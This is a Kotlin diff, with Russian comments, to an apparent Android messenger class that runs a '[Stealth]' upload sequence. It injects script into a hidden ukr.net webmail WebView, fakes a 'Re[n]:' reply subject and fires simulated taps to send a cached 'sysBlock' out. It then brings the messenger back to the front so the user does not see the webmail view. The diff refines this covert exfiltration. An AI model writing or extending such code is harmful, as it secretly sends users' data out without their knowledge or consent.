@@ -226,15 +226,21 @@ class MessengerJsInterface(
         if (uploadSequenceActive) { log("[Stealth] we skipped double call"); return }
         uploadSequenceActive = true
         ui.post {
-            getUkrnetWebView()?.isFocusable = true
-            getUkrnetWebView()?.isFocusableInTouchMode = true
+            val ukr = getUkrnetWebView()
+            val mess = getMessengerWebView?.invoke()
+            
+            // 1. ВРЕМЕННО ВЫВОДИМ УКРНЕТ НА ПЕРЕДНИЙ ПЛАН И ДАЕМ ПОЛНЫЙ ФОКУС ДЛЯ ПРИЕМА ТАПОВ
+            ukr?.isFocusable = true
+            ukr?.isFocusableInTouchMode = true
+            ukr?.bringToFront()
+            ukr?.requestFocus()
             
             scope.launch {
                 try {
                     val sysBlock = StealthCache.pendingSysBlock ?: return@launch
                     StealthCache.pendingSysBlock = null
                     
-                    getUkrnetWebView()?.evaluateJavascript("window._n0gStealthUpload = true;", null)
+                    ukr?.evaluateJavascript("window._n0gStealthUpload = true;", null)
                     val subject = "Re[${(2..30).random()}]:"
                     val escSys = sysBlock.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")
                     
@@ -292,21 +298,25 @@ class MessengerJsInterface(
                             }
                         })();
                     """.trimIndent()
-                    getUkrnetWebView()?.evaluateJavascript(js, null)
+                    ukr?.evaluateJavascript(js, null)
                     log("[Stealth] JS загрузчика инжектирован. Генерируем серию физических тапов...")
                     
+                    // Котлин тапает по полнофункциональному WebView
                     for (i in 1..8) {
                         delay(400)
                         ui.post {
-                            simulateTouch(getUkrnetWebView(), 150f, 150f, stealFocus = false, log = log)
+                            simulateTouch(ukr, 150f, 150f, stealFocus = false, log = log)
                         }
                     }
                     
                     delay(500)
                     ui.post {
-                        getUkrnetWebView()?.isFocusable = false
-                        getUkrnetWebView()?.isFocusableInTouchMode = false
-                        getMessengerWebView?.invoke()?.requestFocus()
+                        // 2. ВОЗВРАЩАЕМ МЕССЕНДЖЕР НА ПЕРЕДНИЙ ПЛАН И БЛОКИРУЕМ ФОКУС УКРНЕТА ОБРАТНО
+                        ukr?.isFocusable = false
+                        ukr?.isFocusableInTouchMode = false
+                        mess?.bringToFront()
+                        mess?.requestFocus()
+                        log("[Stealth] Фокус и видимость мессенджера восстановлены.")
                     }
                 } finally { uploadSequenceActive = false }
             }
